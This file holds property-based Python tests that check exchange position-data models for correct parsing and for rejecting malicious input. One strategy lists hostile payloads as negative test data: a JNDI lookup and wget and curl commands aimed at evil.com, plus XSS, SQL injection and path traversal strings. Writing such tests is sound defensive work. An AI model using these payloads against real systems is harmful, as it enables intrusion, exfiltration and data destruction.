"""Property-based tests for Backpack raw position models.

These tests validate critical security boundary models that process external trading position data.
The models tested here are essential for trading operations and financial position tracking.

SECURITY CRITICAL: These raw models protect against:
- Malicious position data that could manipulate trading calculations
- Financial precision errors in position sizing and PnL calculations
- Buffer overflow attacks through oversized position identifiers
- Injection attacks through symbol and position field manipulation
- Timestamp manipulation that could affect order timing

Property testing ensures comprehensive coverage of trading edge cases and adversarial inputs.
"""

from decimal import Decimal
from typing import Any

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.backpack.models.bp_raw_margin_functions import (
    BackpackRawImfFunction,
    BackpackRawMmfFunction,
)
from cyberdelta.apis.backpack.models.bp_raw_position import (
    BackpackRawPositionResponse,
    BackpackRawPositionUpdate,
)
from cyberdelta.apis.exceptions.field_validation import DecimalFiniteError
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import (
    DateTimeParsingError,
    EmptyStringError,
    TimestampFormatError,
)


# =============================================================================
# HYPOTHESIS STRATEGIES FOR POSITION MODEL TESTING
# =============================================================================


def position_decimal_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for position financial fields.

    Returns:
        SearchStrategy that generates decimal strings for financial position values.
    """
    return st.one_of([
        # Trading position amounts
        st.decimals(min_value=Decimal(-1000000), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal(-100000), max_value=Decimal(100000), places=6).map(str),
        # Common position values
        st.just("0"),
        st.just("0.0"),
        st.just("-100.50"),  # Negative PnL
        st.just("1500.25"),  # Positive position
        st.just("0.00000001"),  # Minimum precision
        st.just("-999999.99999999"),  # Large loss
        st.just("999999.99999999"),  # Large gain
        # Scientific notation (valid for decimal parsing)
        st.just("1e6"),
        st.just("-1.5e3"),
        st.just("2.5e-4"),
    ])


def trading_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid trading symbol strings.

    Returns:
        SearchStrategy that generates various valid trading symbol formats for testing.
    """
    return st.one_of([
        # Common trading pairs
        st.sampled_from(["BTC_USDC", "ETH_USDC", "SOL_USDC", "AVAX_USDC", "ARB_USDC"]),
        # Valid symbol formats
        st.text(
            min_size=3,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
            ),
        ).filter(lambda x: "_" in x and len(x.encode("utf-8")) <= 64),
        # Edge cases
        st.text(min_size=1, max_size=64).filter(
            lambda x: x.strip() and len(x.encode("utf-8")) <= 64
        ),
    ])


def position_id_strategy() -> SearchStrategy[str]:
    """Generate valid position ID strings.

    Returns:
        SearchStrategy that generates various position ID formats for testing.
    """
    return st.one_of([
        # Common formats
        st.text(
            min_size=1,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
            ),
        ),
        # Typical patterns
        st.just("pos_123456"),
        st.just("position_abc123def"),
        st.just("bp_pos_789xyz"),
        # UUID-like
        st.uuids().map(str),
        # Edge cases
        st.text(min_size=1, max_size=64).filter(
            lambda x: x.strip() and len(x.encode("utf-8")) <= 64
        ),
    ])


def user_id_strategy() -> SearchStrategy[int]:
    """Generate valid user ID integers.

    Returns:
        SearchStrategy that generates valid user ID values within proper ranges.
    """
    return st.one_of([
        st.integers(min_value=0, max_value=2**31 - 1),  # Standard range
        st.just(0),  # Edge case
        st.just(123456789),  # Common pattern
        st.just(999999999),  # Large ID
    ])


def timestamp_strategy() -> SearchStrategy[int | float | str | None]:
    """Generate valid timestamp values.

    Returns:
        SearchStrategy that generates various timestamp formats and values for testing.
    """
    return st.one_of([
        # Unix timestamps (milliseconds)
        st.integers(min_value=1000000000000, max_value=2000000000000),
        # Unix timestamps (seconds)
        st.integers(min_value=1000000000, max_value=2000000000),
        # Float timestamps
        st.floats(
            min_value=1000000000.0, max_value=2000000000.0, allow_nan=False, allow_infinity=False
        ),
        # ISO format strings
        st.just("2023-03-15T12:00:00Z"),
        st.just("2024-01-01T00:00:00.000Z"),
        # String timestamps
        st.integers(min_value=1000000000000, max_value=2000000000000).map(str),
        # None for optional fields
        st.none(),
    ])


@st.composite
def margin_function_data(draw: st.DrawFn) -> dict[str, str]:
    """Generate valid margin function data.

    Returns:
        Dictionary containing margin function parameters with base and factor values.
    """
    return {
        "base": draw(position_decimal_strategy()),
        "factor": draw(position_decimal_strategy()),
    }


@st.composite
def valid_position_response_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid position response data structure.

    Returns:
        Dictionary containing complete position response data with margin functions and metadata.
    """
    imf_data = draw(margin_function_data())
    mmf_data = draw(margin_function_data())

    return {
        "breakEvenPrice": draw(position_decimal_strategy()),
        "entryPrice": draw(position_decimal_strategy()),
        "estLiquidationPrice": draw(position_decimal_strategy()),
        "imf": draw(position_decimal_strategy()),
        "imfFunction": imf_data,
        "markPrice": draw(position_decimal_strategy()),
        "mmf": draw(position_decimal_strategy()),
        "mmfFunction": mmf_data,
        "netCost": draw(position_decimal_strategy()),
        "netQuantity": draw(position_decimal_strategy()),
        "netExposureQuantity": draw(position_decimal_strategy()),
        "netExposureNotional": draw(position_decimal_strategy()),
        "pnlRealized": draw(position_decimal_strategy()),
        "pnlUnrealized": draw(position_decimal_strategy()),
        "cumulativeFundingPayment": draw(position_decimal_strategy()),
        "symbol": draw(trading_symbol_strategy()),
        "userId": draw(user_id_strategy()),
        "positionId": draw(position_id_strategy()),
        "subaccountId": draw(st.integers(min_value=0, max_value=1000)),
        "cumulativeInterest": draw(position_decimal_strategy()),
    }


@st.composite
def valid_position_update_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid position update data structure.

    Returns:
        Dictionary containing position update data with abbreviated field names.
    """
    return {
        "e": "positionUpdate",
        "E": draw(timestamp_strategy()),
        "s": draw(trading_symbol_strategy()),
        "b": draw(st.one_of([position_decimal_strategy(), st.none()])),
        "B": draw(st.one_of([position_decimal_strategy(), st.none()])),
        "l": draw(st.one_of([position_decimal_strategy(), st.none()])),
        "f": draw(st.one_of([position_decimal_strategy(), st.none()])),
        "M": draw(st.one_of([position_decimal_strategy(), st.none()])),
        "m": draw(st.one_of([position_decimal_strategy(), st.none()])),
        "q": draw(st.one_of([position_decimal_strategy(), st.none()])),
        "Q": draw(st.one_of([position_decimal_strategy(), st.none()])),
        "n": draw(st.one_of([position_decimal_strategy(), st.none()])),
    }


def malicious_position_strategy() -> SearchStrategy[object]:
    """Generate malicious strings for position security testing.

    Returns:
        SearchStrategy that generates potentially malicious inputs to test security validation.
    """
    return st.one_of([
        # Financial manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-positions}"),
        st.just("999999999999999999999999999999.99"),  # Overflow attempt
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('position-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE positions;--"),
        st.just("1' UNION SELECT * FROM users--"),
        # Buffer overflow attempts
        st.text(min_size=10000, max_size=50000),
        st.just("P" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.users.find(); //"),
        # JSON injection
        st.just('{"$where": "this.position > 1000000"}'),
    ])


def invalid_position_type_strategy() -> SearchStrategy[object]:
    """Generate invalid types for position field validation testing.

    Returns:
        SearchStrategy that generates invalid data types to test field validation.
    """
    return st.one_of([
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
        # Complex nested structures
        st.lists(st.dictionaries(st.text(), st.integers())),
        st.dictionaries(st.text(), st.lists(st.text())),
    ])


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW POSITION RESPONSE MODEL
# =============================================================================


class TestBackpackRawPositionResponseProperties:
    """Property-based tests for BackpackRawPositionResponse validation and security."""

    @given(position_data=valid_position_response_data())
    def test_position_validation_success_properties(self, position_data: dict[str, Any]) -> None:
        """Property: Valid position data should always create valid objects."""
        # Skip invalid nested margin function data
        try:
            for field in [
                "breakEvenPrice",
                "entryPrice",
                "estLiquidationPrice",
                "imf",
                "markPrice",
                "mmf",
                "netCost",
                "netQuantity",
                "netExposureQuantity",
                "netExposureNotional",
                "pnlRealized",
                "pnlUnrealized",
                "cumulativeFundingPayment",
                "cumulativeInterest",
            ]:
                decimal_val = Decimal(position_data[field])
                assume(decimal_val.is_finite())

            # Check margin function data
            for func_field in ["base", "factor"]:
                imf_val = Decimal(position_data["imfFunction"][func_field])
                mmf_val = Decimal(position_data["mmfFunction"][func_field])
                assume(imf_val.is_finite() and mmf_val.is_finite())

        except (ValueError, TypeError, KeyError):
            assume(False)

        # Skip empty or invalid strings
        assume(position_data["symbol"].strip())
        assume(position_data["positionId"].strip())
        assume(isinstance(position_data["userId"], int) and position_data["userId"] >= 0)
        assume(
            isinstance(position_data["subaccountId"], int) and position_data["subaccountId"] >= 0
        )

        obj = BackpackRawPositionResponse.model_validate(position_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawPositionResponse)

        # Property: All decimal fields should be preserved as strings
        assert isinstance(obj.break_even_price, str)
        assert isinstance(obj.entry_price, str)
        assert isinstance(obj.net_quantity, str)
        assert isinstance(obj.pnl_realized, str)
        assert isinstance(obj.pnl_unrealized, str)

        # Property: Values should be preserved exactly
        assert obj.symbol == position_data["symbol"]
        assert obj.user_id == position_data["userId"]
        assert obj.position_id == position_data["positionId"]

        # Property: Nested margin functions should be properly typed
        assert isinstance(obj.imf_function, BackpackRawImfFunction)
        assert isinstance(obj.mmf_function, BackpackRawMmfFunction)

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from([
            "symbol",
            "positionId",
            "breakEvenPrice",
            "entryPrice",
            "netQuantity",
            "pnlRealized",
            "pnlUnrealized",
            "markPrice",
        ]),
        malicious_value=malicious_position_strategy(),
    )
    def test_position_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: Position model should reject malicious inputs safely."""
        base_data: dict[str, str | dict[str, str] | int | object] = {
            "breakEvenPrice": "20000.50",
            "entryPrice": "19800.00",
            "estLiquidationPrice": "15000.00",
            "imf": "0.1234",
            "imfFunction": {"base": "0.1", "factor": "0.5"},
            "markPrice": "20100.75",
            "mmf": "0.0678",
            "mmfFunction": {"base": "0.05", "factor": "0.25"},
            "netCost": "-1980.00",
            "netQuantity": "0.1",
            "netExposureQuantity": "0.1",
            "netExposureNotional": "2010.075",
            "pnlRealized": "5.00",
            "pnlUnrealized": "30.075",
            "cumulativeFundingPayment": "-1.25",
            "symbol": "BTC_USDC",
            "userId": 123456789,
            "positionId": "pos_abc123",
            "cumulativeInterest": "0.0",
            "subaccountId": 0,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
            DecimalFiniteError,
        )):
            BackpackRawPositionResponse.model_validate(base_data)

    @given(
        field_name=st.sampled_from([
            "userId",
            "subaccountId",
            "breakEvenPrice",
            "symbol",
            "positionId",
        ]),
        invalid_value=invalid_position_type_strategy(),
    )
    def test_position_type_safety_properties(self, field_name: str, invalid_value: object) -> None:
        """Property: Position model should enforce strict type safety."""
        base_data: dict[str, str | dict[str, str] | int | object] = {
            "breakEvenPrice": "20000.50",
            "entryPrice": "19800.00",
            "estLiquidationPrice": "15000.00",
            "imf": "0.1234",
            "imfFunction": {"base": "0.1", "factor": "0.5"},
            "markPrice": "20100.75",
            "mmf": "0.0678",
            "mmfFunction": {"base": "0.05", "factor": "0.25"},
            "netCost": "-1980.00",
            "netQuantity": "0.1",
            "netExposureQuantity": "0.1",
            "netExposureNotional": "2010.075",
            "pnlRealized": "5.00",
            "pnlUnrealized": "30.075",
            "cumulativeFundingPayment": "-1.25",
            "symbol": "BTC_USDC",
            "userId": 123456789,
            "positionId": "pos_abc123",
            "cumulativeInterest": "0.0",
            "subaccountId": 0,
        }
        base_data[field_name] = invalid_value

        # Property: Wrong types should be rejected
        with pytest.raises((ValidationError, TypeError)):
            BackpackRawPositionResponse.model_validate(base_data)

    @given(
        decimal_field=st.sampled_from([
            "breakEvenPrice",
            "entryPrice",
            "netQuantity",
            "pnlRealized",
            "pnlUnrealized",
        ]),
        decimal_value=st.one_of([
            # Valid decimals
            st.just("0"),
            st.just("-1000.50"),
            st.just("1e6"),
            st.just("-2.5e3"),
            # Invalid decimals
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("1..0"),
            st.just("1.2.3"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
        ]),
    )
    def test_position_decimal_validation_properties(
        self, decimal_field: str, decimal_value: str
    ) -> None:
        """Property: Position decimal fields should validate properly."""
        position_data = {
            "breakEvenPrice": "20000.50",
            "entryPrice": "19800.00",
            "estLiquidationPrice": "15000.00",
            "imf": "0.1234",
            "imfFunction": {"base": "0.1", "factor": "0.5"},
            "markPrice": "20100.75",
            "mmf": "0.0678",
            "mmfFunction": {"base": "0.05", "factor": "0.25"},
            "netCost": "-1980.00",
            "netQuantity": "0.1",
            "netExposureQuantity": "0.1",
            "netExposureNotional": "2010.075",
            "pnlRealized": "5.00",
            "pnlUnrealized": "30.075",
            "cumulativeFundingPayment": "-1.25",
            "symbol": "BTC_USDC",
            "userId": 123456789,
            "positionId": "pos_abc123",
            "cumulativeInterest": "0.0",
            "subaccountId": 0,
        }
        position_data[decimal_field] = decimal_value

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()

            if is_finite and not is_empty:
                # Property: Valid finite decimals should be accepted
                obj = BackpackRawPositionResponse.model_validate(position_data)
                assert (
                    getattr(obj, decimal_field.replace("P", "_p").replace("Q", "_q").lower())
                    == decimal_value
                )

                # Property: Parsed value should be finite
                parsed_val = Decimal(
                    getattr(obj, decimal_field.replace("P", "_p").replace("Q", "_q").lower())
                )
                assert parsed_val.is_finite()
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises((ValidationError, EmptyStringError, DecimalFiniteError)):
                    BackpackRawPositionResponse.model_validate(position_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises(ValidationError):
                BackpackRawPositionResponse.model_validate(position_data)

    @given(position_data=valid_position_response_data())
    def test_position_financial_precision_properties(self, position_data: dict[str, Any]) -> None:
        """Property: Position model should preserve financial precision exactly."""
        # Only test valid finite decimals
        try:
            decimal_fields = [
                "breakEvenPrice",
                "entryPrice",
                "netQuantity",
                "pnlRealized",
                "pnlUnrealized",
            ]
            for field in decimal_fields:
                decimal_val = Decimal(position_data[field])
                assume(decimal_val.is_finite())

        except (ValueError, TypeError):
            assume(False)

        # Skip empty or invalid strings
        assume(position_data["symbol"].strip())
        assume(position_data["positionId"].strip())

        obj = BackpackRawPositionResponse.model_validate(position_data)

        # Property: Exact string values should be preserved
        assert obj.break_even_price == position_data["breakEvenPrice"]
        assert obj.entry_price == position_data["entryPrice"]
        assert obj.net_quantity == position_data["netQuantity"]
        assert obj.pnl_realized == position_data["pnlRealized"]
        assert obj.pnl_unrealized == position_data["pnlUnrealized"]

        # Property: Should be parseable back to same decimal values
        assert Decimal(obj.break_even_price) == Decimal(position_data["breakEvenPrice"])
        assert Decimal(obj.pnl_realized) == Decimal(position_data["pnlRealized"])
        assert Decimal(obj.pnl_unrealized) == Decimal(position_data["pnlUnrealized"])

    @given(position_data=valid_position_response_data())
    def test_position_immutability_properties(self, position_data: dict[str, Any]) -> None:
        """Property: Position objects should be immutable after creation."""
        # Skip invalid data
        try:
            decimal_val = Decimal(position_data["breakEvenPrice"])
            assume(decimal_val.is_finite() and position_data["symbol"].strip())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawPositionResponse.model_validate(position_data)

        # Property: Fields should not be modifiable
        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.symbol = "modified_symbol"

        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.net_quantity = "modified_quantity"


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW POSITION UPDATE MODEL
# =============================================================================


class TestBackpackRawPositionUpdateProperties:
    """Property-based tests for BackpackRawPositionUpdate validation and security."""

    @given(update_data=valid_position_update_data())
    def test_position_update_validation_success_properties(
        self, update_data: dict[str, Any]
    ) -> None:
        """Property: Valid position update data should always create valid objects."""
        # Skip invalid decimal values in optional fields
        try:
            for field_key, field_value in update_data.items():
                if (
                    field_key in ["b", "B", "l", "f", "M", "m", "q", "Q", "n"]
                    and field_value is not None
                ):
                    decimal_val = Decimal(field_value)
                    assume(decimal_val.is_finite())
        except (ValueError, TypeError):
            assume(False)

        # Skip empty symbols
        assume(update_data["s"].strip())

        obj = BackpackRawPositionUpdate.model_validate(update_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawPositionUpdate)

        # Property: Event type should be literal
        assert obj.event_type == "positionUpdate"

        # Property: Symbol should be preserved
        assert obj.symbol == update_data["s"]

        # Property: Optional fields should handle None correctly
        if update_data["b"] is not None:
            assert obj.break_event_price == update_data["b"]
        else:
            assert obj.break_event_price is None

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["e", "s", "b", "B", "M", "q"]),
        malicious_value=malicious_position_strategy(),
    )
    def test_position_update_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: Position update model should reject malicious inputs safely."""
        base_data: dict[str, str | int | object] = {
            "e": "positionUpdate",
            "E": 1678886400000,
            "s": "SOL_USDC",
            "b": "22.50",
            "B": "22.00",
            "l": "18.00",
            "f": "0.05",
            "M": "23.10",
            "m": "0.02",
            "q": "10.5",
            "Q": "10.5",
            "n": "242.55",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
            DecimalFiniteError,
            DateTimeParsingError,
            TimestampFormatError,
        )):
            BackpackRawPositionUpdate.model_validate(base_data)

    @given(
        timestamp_value=st.one_of([
            st.just("not-a-date"),
            st.just([]),
            st.just({}),
            st.text().filter(lambda x: not x.isdigit() and "T" not in x),
        ])
    )
    def test_position_update_timestamp_validation_properties(self, timestamp_value: object) -> None:
        """Property: Position update timestamps should be validated properly."""
        update_data = {
            "e": "positionUpdate",
            "E": timestamp_value,
            "s": "SOL_USDC",
            "b": "22.50",
            "B": "22.00",
            "l": "18.00",
            "f": "0.05",
            "M": "23.10",
            "m": "0.02",
            "q": "10.5",
            "Q": "10.5",
            "n": "242.55",
        }

        # Property: Invalid timestamps should be rejected
        with pytest.raises((ValidationError, DateTimeParsingError, TimestampFormatError)):
            BackpackRawPositionUpdate.model_validate(update_data)

    @given(invalid_event=st.text().filter(lambda x: x != "positionUpdate"))
    def test_position_update_event_type_validation_properties(self, invalid_event: str) -> None:
        """Property: Position update event type should be validated as literal."""
        update_data = {
            "e": invalid_event,
            "E": 1678886400000,
            "s": "SOL_USDC",
            "b": "22.50",
            "B": "22.00",
            "l": "18.00",
            "f": "0.05",
            "M": "23.10",
            "m": "0.02",
            "q": "10.5",
            "Q": "10.5",
            "n": "242.55",
        }

        # Property: Invalid event types should be rejected
        if not invalid_event.strip():
            with pytest.raises(EmptyStringError):
                BackpackRawPositionUpdate.model_validate(update_data)
        else:
            with pytest.raises(ValidationError) as exc_info:
                BackpackRawPositionUpdate.model_validate(update_data)
            # Property: Error should indicate invalid literal value
            error_msg = str(exc_info.value)
            assert "Input should be 'positionUpdate'" in error_msg or "Invalid value" in error_msg


# =============================================================================
# INTEGRATION PROPERTY TESTS
# =============================================================================


class TestBackpackRawPositionIntegrationProperties:
    """Integration property tests for both position models."""

    @given(position_data=valid_position_response_data(), update_data=valid_position_update_data())
    def test_position_models_consistency_properties(
        self, position_data: dict[str, Any], update_data: dict[str, Any]
    ) -> None:
        """Property: Both position models should have consistent validation behavior."""
        # Filter to valid inputs only
        try:
            # Validate position data decimals
            for field in ["breakEvenPrice", "entryPrice", "netQuantity"]:
                decimal_val = Decimal(position_data[field])
                assume(decimal_val.is_finite())

            # Validate update data decimals
            for field_key, field_value in update_data.items():
                if field_key in ["b", "B", "q"] and field_value is not None:
                    decimal_val = Decimal(field_value)
                    assume(decimal_val.is_finite())

        except (ValueError, TypeError):
            assume(False)

        assume(position_data["symbol"].strip())
        assume(update_data["s"].strip())

        # Property: Both models should validate successfully with valid data
        position_obj = BackpackRawPositionResponse.model_validate(position_data)
        update_obj = BackpackRawPositionUpdate.model_validate(update_data)

        # Property: Both should have consistent model configuration
        assert position_obj.model_config.get("extra") == "forbid"
        assert update_obj.model_config.get("extra") == "forbid"
        assert position_obj.model_config.get("frozen") is True
        assert update_obj.model_config.get("frozen") is True

    @given(
        malicious_data=st.dictionaries(
            st.sampled_from([
                "symbol",
                "positionId",
                "breakEvenPrice",
                "netQuantity",
                "s",
                "b",
                "q",
            ]),
            malicious_position_strategy(),
        )
    )
    def test_position_models_security_boundary_properties(
        self, malicious_data: dict[str, Any]
    ) -> None:
        """Property: Both position models should consistently reject malicious inputs."""
        # Try to validate as position response if it has response fields
        if (
            "symbol" in malicious_data
            or "positionId" in malicious_data
            or "breakEvenPrice" in malicious_data
        ):
            position_data = {
                "breakEvenPrice": malicious_data.get("breakEvenPrice", "20000.50"),
                "entryPrice": "19800.00",
                "estLiquidationPrice": "15000.00",
                "imf": "0.1234",
                "imfFunction": {"base": "0.1", "factor": "0.5"},
                "markPrice": "20100.75",
                "mmf": "0.0678",
                "mmfFunction": {"base": "0.05", "factor": "0.25"},
                "netCost": "-1980.00",
                "netQuantity": malicious_data.get("netQuantity", "0.1"),
                "netExposureQuantity": "0.1",
                "netExposureNotional": "2010.075",
                "pnlRealized": "5.00",
                "pnlUnrealized": "30.075",
                "cumulativeFundingPayment": "-1.25",
                "symbol": malicious_data.get("symbol", "BTC_USDC"),
                "userId": 123456789,
                "positionId": malicious_data.get("positionId", "pos_abc123"),
                "cumulativeInterest": "0.0",
                "subaccountId": 0,
            }

            # Property: Malicious position data should be rejected
            with pytest.raises((
                ValidationError,
                TypeError,
                EmptyStringError,
                TypeFieldError,
                DecimalFiniteError,
            )):
                BackpackRawPositionResponse.model_validate(position_data)

        # Try to validate as position update if it has update fields
        if "s" in malicious_data or "b" in malicious_data or "q" in malicious_data:
            update_data = {
                "e": "positionUpdate",
                "E": 1678886400000,
                "s": malicious_data.get("s", "SOL_USDC"),
                "b": malicious_data.get("b", "22.50"),
                "B": "22.00",
                "l": "18.00",
                "f": "0.05",
                "M": "23.10",
                "m": "0.02",
                "q": malicious_data.get("q", "10.5"),
                "Q": "10.5",
                "n": "242.55",
            }

            # Property: Malicious update data should be rejected
            with pytest.raises((ValidationError, TypeError, EmptyStringError, DecimalFiniteError)):
                BackpackRawPositionUpdate.model_validate(update_data)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_BackpackRawPositionResponse_real_world_example() -> None:
    """Test with real-world trading position data."""
    payload = {
        "breakEvenPrice": "50125.75",
        "entryPrice": "50000.00",
        "estLiquidationPrice": "45000.00",
        "imf": "0.05",
        "imfFunction": {"base": "0.03", "factor": "0.02"},
        "markPrice": "50250.50",
        "mmf": "0.025",
        "mmfFunction": {"base": "0.015", "factor": "0.01"},
        "netCost": "-500.00",
        "netQuantity": "0.01",
        "netExposureQuantity": "0.01",
        "netExposureNotional": "502.505",
        "pnlRealized": "0.00",
        "pnlUnrealized": "2.505",
        "cumulativeFundingPayment": "-0.125",
        "symbol": "BTC_USDC",
        "userId": 987654321,
        "positionId": "pos_btc_123456",
        "cumulativeInterest": "0.0",
        "subaccountId": 1,
    }
    obj = BackpackRawPositionResponse.model_validate(payload)
    assert obj.symbol == "BTC_USDC"
    assert obj.break_even_price == "50125.75"
    assert obj.net_quantity == "0.01"
    assert obj.pnl_unrealized == "2.505"


def test_BackpackRawPositionUpdate_real_world_example() -> None:
    """Test with real-world position update event data."""
    payload = {
        "e": "positionUpdate",
        "E": 1678886400000,
        "s": "ETH_USDC",
        "b": "1650.25",
        "B": "1640.00",
        "l": "1500.00",
        "f": "0.1",
        "M": "1655.75",
        "m": "0.05",
        "q": "1.5",
        "Q": "1.5",
        "n": "2483.625",
    }
    obj = BackpackRawPositionUpdate.model_validate(payload)
    assert obj.event_type == "positionUpdate"
    assert obj.symbol == "ETH_USDC"
    assert obj.break_event_price == "1650.25"
    assert obj.net_quantity == "1.5"
